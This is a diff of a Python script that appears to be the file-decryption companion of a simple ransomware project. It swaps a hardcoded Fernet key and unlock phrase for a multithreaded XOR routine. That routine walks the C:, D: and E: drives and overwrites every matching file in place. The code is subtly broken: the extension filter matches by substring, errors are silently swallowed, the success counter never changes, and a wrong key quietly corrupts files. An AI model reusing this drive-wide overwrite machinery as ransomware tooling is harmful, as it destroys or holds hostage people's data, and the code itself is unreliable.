@@ -1,34 +1,81 @@
-#!/usr/bin/env/python3
-
 import os
+# import string
+# import random
+# import socket
+# from datetime import datetime
+from threading import Thread
+from queue import Queue
 
-from cryptography.fernet import Fernet
+No_of_decrypt = 0
 
-files = []
+#file extensions to decrypt
+decrypted_extensions = ('.txt')
 
-for file in os.listdir():
-        if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py" or file == "encrypt.exe":
-                continue
-        if os.path.isfile(file):
-                files.append(file)
-print(files)
-'''
-with open("thekey.key","rb") as key:
-	secretkey = key.read()
-'''
-secretkey = "PTcwlSWHacc59Wo8mD2g4Qba6jTcXgjLbXnVPHlfvaY="
-secret_phrase = "Godzilla"
+decryption_level = 128 // 8
+key = input("Enter Key : ")
 
-user_phrase = input("Enter the secret phrase to unlock the files : ")
+# grab all files from the machine
+file_paths = []
+for root,dirs,files in os.walk('C:\\'):
+    for file in files:
+        file_path, file_ext =  os.path.splitext(root+'\\'+file)
+        if file_ext in decrypted_extensions:
+            file_paths.append(root+'\\'+file)
+try :
+    for root,dirs,files in os.walk('D:\\'):
+        for file in files:
+            file_path, file_ext =  os.path.splitext(root+'\\'+file)
+            if file_ext in decrypted_extensions:
+                file_paths.append(root+'\\'+file)
+except:
+    pass
+try :
+    for root,dirs,files in os.walk('E:\\'):
+        for file in files:
+            file_path, file_ext =  os.path.splitext(root+'\\'+file)
+            if file_ext in decrypted_extensions:
+                file_paths.append(root+'\\'+file)
+except:
+    pass
 
-while user_phrase != secret_phrase:
-	print("Wrong Phrase!!! Try Again.")
-	user_phrase = input("Enter the secret phrase to unlock the files : ")
-else:
-	for file in files:
-	        with open(file,"rb") as thefile:
-	                contents = thefile.read()
-	        contents_decrypted = Fernet(secretkey).decrypt(contents)
-	        with open(file,"wb") as thefile:
-	                thefile.write(contents_decrypted)
-	print("Your Files Have been decrypted  :)")                
+#Decrypt Files
+def decrypt(key):
+    while q.not_empty:
+        file = q.get()
+        index = 0
+        max_index = decryption_level - 1
+        try:
+            with open(file,'rb') as f:
+                data = f.read()
+            with open(file,'wb') as f:
+                for byte in data:
+                    xor_byte = byte ^ ord(key[index])
+                    f.write(xor_byte.to_bytes(1, 'little'))
+                    if index >= max_index:
+                        index = 0
+                    else:
+                        index += 1
+            print(f'Decrypted {file}')
+            No_of_encrypt += 1
+        except:
+            # print(f'Failed to encrypt {file}')
+            pass
+        q.task_done()
+
+
+
+# Multi Threading
+q = Queue()
+for file in file_paths:
+    q.put(file)
+for i in range(30):
+    thread = Thread(target=decrypt, args=(key,), daemon=True)
+    thread.start()
+
+
+
+q.join()
+print('Decryption Successful.')
+print(f'No of Successful Decryptions : {No_of_decrypt}')
+
+input()
